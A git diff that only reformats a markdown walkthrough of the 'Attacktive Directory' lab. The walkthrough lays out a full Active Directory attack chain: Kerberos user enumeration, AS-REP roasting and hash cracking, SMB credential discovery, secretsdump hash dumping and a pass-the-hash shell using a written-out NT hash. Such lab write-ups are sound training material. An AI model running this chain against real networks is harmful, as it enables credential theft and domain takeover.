@@ -28,16 +28,12 @@ This writeup documents the penetration testing of the [**Attacktive Directory**]
 # Information Gathering
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
+```
 ❯ ping -c 1 10.10.221.181
-```
-```
 PING 10.10.221.181 (10.10.221.181) 56(84) bytes of data.
 64 bytes from 10.10.221.181: icmp_seq=1 ttl=127 time=54.5 ms
 
@@ -48,10 +44,8 @@ rtt min/avg/max/mdev = 54.500/54.500/54.500/0.000 ms
 
 In this case, the target seems to be a Windows machine. Let's perform some scans.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.221.181 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:32 CET
 Initiating SYN Stealth Scan at 21:32
@@ -132,10 +126,8 @@ Nmap done: 1 IP address (1 host up) scanned in 55.71 seconds
            Raw packets sent: 275840 (12.137MB) | Rcvd: 60645 (2.426MB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49683,49696,49712 10.10.221.181 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:34 CET
 Nmap scan report for 10.10.221.181
 Host is up (0.080s latency).
@@ -220,11 +212,8 @@ I'll add this in my ``/etc/hosts`` file:
 
 Now, we can perform **bruteforce** over Kerberos (port 88) with the tool [**Kerbrute**](https://github.com/ropnop/kerbrute/releases) to enumerate users, passwords and even password spray. I'll use the wordlist that you can find in the description of this machine.
 
-```bash
+```
 ❯ ./kerbrute_linux_amd64 userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt
-```
-```
-
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -257,19 +246,14 @@ The notable accounts of this list are ``svc-admin`` and ``backup``.
 
 [Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called GetNPUsers.pythat will allow us to query ASReproastable accounts from the Key Distribution Center using the list of users we got before.
 
-```bash
+```
 ❯ GetNPUsers.py spookysec.local/svc-admin -no-pass
-```
-```
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0afe***REDACTED_HASH***
-```
-```bash
+
 ❯ GetNPUsers.py spookysec.local/backup -no-pass
-```
-```
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for backup
@@ -280,10 +264,8 @@ We have got a TGT for svc-admin. We can try to identify the provided hash in thi
 
 The hash is a ``Kerberos 5 AS-REP etype 23``, mode 18200. Now, I'll try to crack the hash with the password's wordlist provided.
 
-```bash
+```
 ❯ john -w:../scripts/passwordlist.txt hash
-```
-```
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 7 OpenMP threads
@@ -296,10 +278,8 @@ Session completed.
 
 We have valid credentials in the domain, so now we can attempt to enumerate shared resources of the DC. I'll use ``smbclient``.
 
-```bash
+```
 ❯ smbclient -L //10.10.221.181 -U svc-admin
-```
-```
 Password for [WORKGROUP\svc-admin]:
 
 	Sharename       Type      Comment
@@ -328,10 +308,8 @@ smb: \>
 
 We have base64 encoded backup credentials. Let's decode the credentials of the backup user.
 
-```bash
+```
 ❯ echo "***REDACTED***" | base64 -d; echo
-```
-```
 ***REDACTED***
 ```
 
@@ -343,10 +321,8 @@ The backup user is the backup account for the Domain Controller. This account ha
 
 I'll use a Impacket tool called ``secretsdump.py``. This will dump all password hashes that this user has.
 
-```bash
+```
 ❯ secretsdump.py -just-dc backup@spookysec.local
-```
-```
 ...
 Administrator:500:***REDACTED***:::
 ...
@@ -354,10 +330,8 @@ Administrator:500:***REDACTED***:::
 
 Now, let's perform PTH.
 
-```bash
+```
 ❯ evil-winrm -i 10.10.221.181 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
-```
-```
 Evil-WinRM shell v3.7
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
